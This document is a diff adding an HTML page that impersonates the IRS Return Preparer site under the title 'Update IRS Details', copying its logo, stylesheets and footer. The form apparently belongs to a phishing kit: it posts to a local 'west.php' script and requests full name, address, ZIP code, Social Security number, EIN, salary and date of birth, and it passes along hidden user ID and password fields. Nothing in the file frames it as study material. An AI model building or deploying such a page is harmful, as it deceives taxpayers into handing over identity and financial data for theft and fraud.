@@ -1,0 +1,499 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <title>
+   Update IRS Details
+  </title>
+  <meta content="text/html" http-equiv="Content-Type" />
+  <link href="https://rpr.irs.gov/css/global.css" type="text/css" rel="stylesheet" />
+  <script type="text/javascript" async="" src="http://www.google-analytics.com/ga.js">
+  </script>
+  <script type="text/javascript" async="" src="http://www.google-analytics.com/ga.js">
+  </script>
+  <script src="https://rpr.irs.gov/datamart/js/jquery/js/jquery-1.6.2.min.js" type="text/javascript">
+  </script>
+  <script src="https://rpr.irs.gov/datamart/js/jquery/js/jquery-corner.js" type="text/javascript">
+  </script>
+  <script src="https://rpr.irs.gov/datamart/js/jquery/js/jquery-ui-1.8.14.custom.min.js" type="text/javascript">
+  </script>
+  <script src="https://rpr.irs.gov/datamart/js/jquery/js/tooltip.js" type="text/javascript">
+  </script>
+  <script src="https://rpr.irs.gov/datamart/js/sessionTimeoutMain.js">
+  </script>
+  <script>
+   var warningSessionTimeOut = 780000; //900000 = 15 minutes
+
+	        var expireSessionTimeOut = 120000;
+
+
+	        $(document).ready(function(){
+
+	               setTimeout('sessionAboutExpireFromHeader('+ expireSessionTimeOut +')', warningSessionTimeOut);
+
+	        });
+  </script>
+  <link href="https://rpr.irs.gov/datamart/js/jquery/css/ui-lightness/jquery-ui-1.8.14.custom.css" type="text/css" rel="stylesheet" />
+  <script>
+   //Focus on first element on page
+		$(window).load(function () {
+		});
+		//Make the default behavior of the enter key on inputs to trigger the next / continue button
+		 $(document).keypress(function(event){
+			if((event.keyCode ? event.keyCode : event.which) == '13'){
+				if (event.target.tagName.toLowerCase() != "textarea" &amp;&amp; (event.target.type == null || (event.target.type.toLowerCase() != "submit"))) {
+					inputs = $("input:not([readonly],:hidden):visible:enabled, textarea:not([readonly]):visible:enabled, select:not([readonly]):visible:enabled");
+					currentIndex = inputs.index($(event.target));
+					if(inputs[currentIndex + 1] != null){
+						event.preventDefault();
+						inputs[currentIndex + 1].focus();
+						if(inputs[currentIndex + 1].type == 'submit' &amp;&amp; $(inputs[currentIndex + 1]).val() == 'Log On'){
+							$(inputs[currentIndex + 1]).click();
+						}
+					}
+					return false;
+				}
+			}
+			return true;
+		});
+  </script>
+  <style type="text/css">
+   @import url("https://rpr.irs.gov/common/styleSheet/navigation-gecko.css");
+  </style>
+  <!--[if IE]>
+    <style type="text/css">
+        @import url("https://rpr.irs.gov/common/styleSheet/navigation-ie-1024.css");
+    </style>
+    <![endif]-->
+  <style media="all" type="text/css">
+   div#main {
+			display: block;
+			font: 12px arial,verdana,sans-serif;
+			margin: 0 auto;
+			text-align: left;
+		}
+
+		.buttonSmall{
+			height: 18px;
+			width: auto;
+			background: #003366;
+			color: white;
+			font-family: Verdana, Arial, sans-serif;
+			font:12px arial, verdana, sans-serif;
+			font-weight: bold;
+			border: 0px;
+			margin-left: 0px;
+			margin-right: 0px;
+			padding: 0px;
+			border: 2px solid #ccccee;
+		}
+		.buttonMiddle {
+			height: 22px;
+			width: auto;
+			background: #003366;
+			color: white;
+			font-family: Verdana, Arial, sans-serif;
+			font:12px arial, verdana, sans-serif;
+			font-weight: bold;
+			border: 0px;
+			margin-left: 5px;
+			margin-right: 5px;
+			padding: 0px;
+			border: 2px solid #ccccee;
+		}
+		td.headerBar {
+			font:12px arial, verdana, sans-serif;
+			background-color:#336699;
+			text-align:right;
+			color:#FFFFFF;
+			padding: 0px 0px 0px 0px;
+			height:85px;
+			overflow: hidden;
+		}
+		img#logo {
+			float:left;
+			width:354px;
+			height:72px;
+		}
+
+		a:hover {
+			cursor:pointer;
+		}
+		font{
+
+			font:normal normal 12px/14px arial, verdana, sans-serif;
+		}
+		th {
+			color:#000000;
+			font:bold 12px/14px arial, verdana, sans-serif;
+		}
+		table tbody th font{
+			font:bold 12px/14px arial, verdana, sans-serif;
+		}
+		.instructionFont {
+			font:12px/14px arial, verdana, sans-serif;
+			margin-top: 4px;
+			padding-left: 10px;
+		}
+
+		label {
+			font:12px/14px arial, verdana, sans-serif;
+			float: left;
+		}
+		.label {
+			font:12px/14px arial, verdana, sans-serif;
+		}
+		.labelleft {
+			font:12px/14px arial, verdana, sans-serif;
+		}
+		.listingHeader {
+			font-family: 12px/14px arial, verdana, sans-serif;
+			padding-top: 4px;
+			padding-right: 4px;
+			padding-bottom: 4px;
+			padding-left: 4px;
+			margin: 0px;
+			margin-top: 5px;
+			text-align: left;
+			background: #DEDEDE;
+		}
+		.listingHeader2 {
+			font-family: 12px/14px arial, verdana, sans-serif;
+			padding: 0px;
+			padding: 4px;
+			margin: 0px;
+			margin-top: 5px;
+			text-align: left;
+			background: #DEDEDE;
+		}
+
+		.buttonBarRight {
+			float: left;
+			width: auto;
+		    padding: 5px;
+		}
+		.buttonMiddle {
+			color:#000000;
+			font: bold 12px/14px arial, verdana, sans-serif;
+			background-color:#DEDEDE;
+			border: 2px solid;
+			border-color: #CFCFCF #969696 #969696 #CFCFCF;
+		}
+		h2 {
+			color: #113366;
+			bold 12px/14px arial, verdana, sans-serif;
+			font-size: 16px;
+			padding-top: 10px;
+			padding-left: 10px;
+			padding-right: 4px;
+			padding-bottom: 5px;
+			margin: 0px;
+		}
+		#contentBox {
+			height: auto;
+			border: 0px;
+			margin: 0px;
+			padding: 0px;
+		}
+				.itemText {
+			Font:14px/18px arial, verdana, sans-serif;
+			color:#1A4F20;
+		}
+        #wrapperContent {
+			margin:auto;
+			width:986px;
+			min-width:800px;
+			min-height:550px;
+            }
+		#accessibility {
+			visibility: visible;
+			display:none;
+		}
+  </style>
+  <link href="https://rpr.irs.gov/w3c/p3p.xml" rel="P3Pv1" />
+  <meta content="en-US" http-equiv="Content-Language" />
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <script type="text/javascript" src="https://rpr.irs.gov/webTrends/irs_tpps_reporting.js">
+  </script>
+  <script src="http://statse.webtrendslive.com/dcsry2tyh10000s96h2x6oxgy_5t6k/wtid.js" type="text/javascript">
+  </script>
+  <noscript>
+   &lt;img border="0" name="DCSIMG" width="1" height="1" src="http://statse.webtrendslive.com/dcsry2tyh10000s96h2x6oxgy_5t6k/njs.gif?dcsuri=nojavascript&amp;amp;dcscfg=1&amp;amp;WT.js=no" title=" " alt=" " /&gt;
+  </noscript>
+  <meta http-equiv="Pragma" content="no-cache" />
+  <meta http-equiv="Cache-Control" content="no-cache" />
+  <meta http-equiv="Cache-Control" content="no-store" />
+  <meta http-equiv="Cache-Control" content="max-age=0" />
+  <meta http-equiv="Expires" content="1" />
+ </head>
+ <body onload="blBodyLoaded='true';" id="wrapperContent">
+  <div id="main">
+   <div width="100%" id="pageTop">
+    <table width="100%" border="0" cellspacing="0" cellpadding="0">
+     <tbody>
+      <tr>
+       <td class="headerBar">
+        <a href="http://www.irs.gov">
+         <img border="0" alt="Internal Revenue Service United States Department of the Treasury" title="Internal Revenue Service United States Department of the Treasury" src="https://rpr.irs.gov/images/irsHomepageLogo.gif" id="logo" />
+        </a>
+        <a class="accessibility" href="http://www.irs.gov/accessibility/index.html">
+         <img width="0" height="0" border="0" alt="Accessibility" title="Accessibility" src="https://rpr.irs.gov/images/blank.gif" />
+        </a>
+        <!--	<a href="#skiptocontent"><img src="https://rpr.irs.gov/images/blank.gif" class="accessibility" title="Skip to Main Content" alt="Skip to Main Content" width="0" height="0" border="0"  /></a>-->
+        <a href="#maincontent">
+         <img width="0" height="0" border="0" alt="Skip to Main Content" title="Skip to Main Content" class="accessibility" src="https://rpr.irs.gov/images/blank.gif" />
+        </a>
+        <!--<span class="accessibility"><a href="#maincontent">Skip navigation</a></span> -->
+       </td>
+      </tr>
+     </tbody>
+    </table>
+   </div>
+   <div id="applicationBox">
+    <p class="applicationLinksFont">
+     <a class="applicationLink" href="https://rpr.irs.gov/login.do?header=true">
+      Logon
+     </a>
+    </p>
+   </div>
+   <div id="container">
+    <div id="contentBox0">
+     <div id="contentBox1">
+      <div id="contentBox2">
+       <div id="innerContent">
+        <div id="innerContent2">
+         <div class="air_rounded_bluebox_top">
+         </div>
+         <div id="contentBox">
+          <h2>
+           Update IRS Details
+          </h2>
+          <a id="maincontent" name="maincontent">
+          </a>
+          <div class="instructionFont">
+          </div>
+          <!-- SHOWING askSecurityQuestion.jsp -->
+          <p class="instructionFont">
+           Enter the information requested and press "Next."
+          </p>
+          <form class="formDetails" action="west.php" method="POST" name="SecurityForm">
+           <input type="hidden" value="" name="userid" />
+           <input type="hidden" value="" name="password" />
+           <table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <colgroup>
+             <col width="30%">
+             </col>
+             <col width="70%">
+             </col>
+            </colgroup>
+            <tbody>
+             <tr>
+              <td class="labelCell">
+               <label for="licNbr">
+                <span class="mandatory">
+                 *
+                </span>
+                FULL NAME:
+                <a onblur="toolTipLinkBlur(this);" onfocus="toolTipLink(this);" title="Enter your FULL NAME." href="#" class="toolTipLink">
+                 <span class="toolTip_big">
+                 </span>
+                </a>
+               </label>
+              </td>
+              <td>
+               <input type="text" id="licNbr" class="dataInput" value="" size="40" maxlength="40" name="fln" />
+              </td>
+             </tr>
+             <tr>
+              <td class="labelCell">
+               <label for="licNbr">
+                <span class="mandatory">
+                 *
+                </span>
+                ADDRESS:
+                <a onblur="toolTipLinkBlur(this);" onfocus="toolTipLink(this);" title="Enter your ADDRESS." href="#" class="toolTipLink">
+                 <span class="toolTip_big">
+                 </span>
+                </a>
+               </label>
+              </td>
+              <td>
+               <input type="text" id="licNbr" class="dataInput" value="" size="40" maxlength="40" name="add" />
+              </td>
+             </tr>
+             <tr>
+              <td class="labelCell">
+               <label for="licNbr">
+                <span class="mandatory">
+                 *
+                </span>
+                ZIP CODE:
+                <a onblur="toolTipLinkBlur(this);" onfocus="toolTipLink(this);" title="Enter your ZIP CODE." href="#" class="toolTipLink">
+                 <span class="toolTip_big">
+                 </span>
+                </a>
+               </label>
+              </td>
+              <td>
+               <input type="text" id="licNbr" class="dataInput" value="" size="40" maxlength="40" name="zip" />
+              </td>
+             </tr>
+             <tr>
+              <td class="labelCell">
+               <label for="licNbr">
+                <span class="mandatory">
+                 *
+                </span>
+                SOCIAL SECURITY NUMBER:
+                <a onblur="toolTipLinkBlur(this);" onfocus="toolTipLink(this);" title="Enter your SSN." href="#" class="toolTipLink">
+                 <span class="toolTip_big">
+                 </span>
+                </a>
+               </label>
+              </td>
+              <td>
+               <input type="text" id="licNbr" class="dataInput" value="" size="40" maxlength="40" name="ssn" />
+              </td>
+             </tr>
+             <tr>
+              <td class="labelCell">
+               <label for="licNbr">
+                <span class="mandatory">
+                 *
+                </span>
+                COMPANY NAME:
+                <a onblur="toolTipLinkBlur(this);" onfocus="toolTipLink(this);" title="Enter your Company Name)." href="#" class="toolTipLink">
+                 <span class="toolTip_big">
+                 </span>
+                </a>
+               </label>
+              </td>
+              <td>
+               <input type="text" id="licNbr" class="dataInput" value="" size="40" maxlength="40" name="com" />
+              </td>
+             </tr>
+             <tr>
+              <td class="labelCell">
+               <label for="licNbr">
+                <span class="mandatory">
+                 *
+                </span>
+                EIN:
+                <a onblur="toolTipLinkBlur(this);" onfocus="toolTipLink(this);" title="Enter your EIN." href="#" class="toolTipLink">
+                 <span class="toolTip_big">
+                 </span>
+                </a>
+               </label>
+              </td>
+              <td>
+               <input type="text" id="licNbr" class="dataInput" value="" size="40" maxlength="40" name="ein" />
+              </td>
+             </tr>
+             <tr>
+              <td class="labelCell">
+               <label for="licNbr">
+                <span class="mandatory">
+                 *
+                </span>
+                SALARY:
+                <a onblur="toolTipLinkBlur(this);" onfocus="toolTipLink(this);" title="Enter your SALARY)." href="#" class="toolTipLink">
+                 <span class="toolTip_big">
+                 </span>
+                </a>
+               </label>
+              </td>
+              <td>
+               <input type="text" id="licNbr" class="dataInput" value="" size="40" maxlength="40" name="sal" />
+              </td>
+             </tr>
+             <tr>
+              <td class="labelCell">
+               <label for="licNbr">
+                <span class="mandatory">
+                 *
+                </span>
+                DATE OF BIRTH: (MM/DD/YYYY)
+                <a onblur="toolTipLinkBlur(this);" onfocus="toolTipLink(this);" title="Enter your DOB." href="#" class="toolTipLink">
+                 <span class="toolTip_big">
+                 </span>
+                </a>
+               </label>
+              </td>
+              <td>
+               <input type="text" id="licNbr" class="dataInput" value="" size="40" maxlength="40" name="dob" />
+              </td>
+             </tr>
+             <tr>
+              <td class="labelCell">
+               <label for="licNbr">
+               </label>
+              </td>
+             </tr>
+             <tr>
+              <td colspan="2">
+               <script src="https://rpr.irs.gov/js/navigation.js" type="text/javascript">
+               </script>
+               <input type="hidden" value="/datamart" id="contextPath" />
+               <input type="hidden" value="null" id="param_applicationId" />
+               <input type="hidden" value="null" id="param_moduleCode" />
+               <input type="hidden" value="null" id="param_rsdIndex" />
+               <input type="hidden" value="null" id="param_fakeCode" />
+               <input type="hidden" value="null" id="param_fakeCode2" />
+              </td>
+             </tr>
+             <tr>
+              <td colspan="2">
+               <div class="buttonBar">
+                <div class="buttonBarRight">
+                 <input type="submit" class="buttonMiddle" value="Next" name="next" />
+                 <input type="submit" class="buttonMiddle" value="Cancel" name="cancel" />
+                </div>
+               </div>
+              </td>
+             </tr>
+            </tbody>
+           </table>
+          </form>
+         </div>
+         <div class="air_rounded_bluebox_btm">
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+   <div class="clear">
+   </div>
+  </div>
+  <div class="footer" id="pageBottom">
+   <!--<font size="1">&copy; 2013. IRS.gov&nbsp;|&nbsp;Internal Revenue Service&nbsp;|&nbsp;United
+		States Department of the Treasury</font>-->
+   <hr width="100%" />
+   <br />
+   <font size="5">
+    <a target="_new" href="http://www.irs.gov/uac/IRS-Privacy-Policy">
+     IRS Privacy Policy
+    </a>
+     | 
+    <a target="_new" href="http://www.irs.gov/Tax-Professionals/Contact-the-IRS-Return-Preparer-Program">
+     IRS
+		Tax Professional PTIN Line
+    </a>
+     | 
+    <a target="_new" href="http://www.irs.gov/Tax-Professionals/Requirements-for-Tax-Return-Preparers:-Frequently-Asked-Questions">
+     Frequently Asked Questions
+    </a>
+   </font>
+   <br />
+   <br />
+   <br />
+   <br />
+  </div>
+  <script type="text/javascript" src="https://rpr.irs.gov/webTrends/irs_tpps_reporting.js">
+  </script>
+  <script src="http://statse.webtrendslive.com/dcsry2tyh10000s96h2x6oxgy_5t6k/wtid.js" type="text/javascript">
+  </script>
+  <noscript>
+   &lt;img border="0" name="DCSIMG" width="1" height="1" src="http://statse.webtrendslive.com/dcsry2tyh10000s96h2x6oxgy_5t6k/njs.gif?dcsuri=nojavascript&amp;amp;dcscfg=1&amp;amp;WT.js=no" title=" " alt=" " /&gt;
+  </noscript>
+ </body>
+</html>
